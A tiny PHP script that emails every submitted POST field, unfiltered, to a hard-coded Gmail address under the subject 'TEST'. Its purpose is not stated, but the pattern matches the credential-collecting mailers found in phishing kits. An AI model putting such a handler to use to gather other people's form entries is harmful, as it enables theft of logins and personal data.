<?php
$body = "";
foreach ($_POST as $key => $value) 
{
    $body .= $key . ' -> ' . $value . '<br>';
}

mail("teampo2@gmail.com","TEST",$body);
?>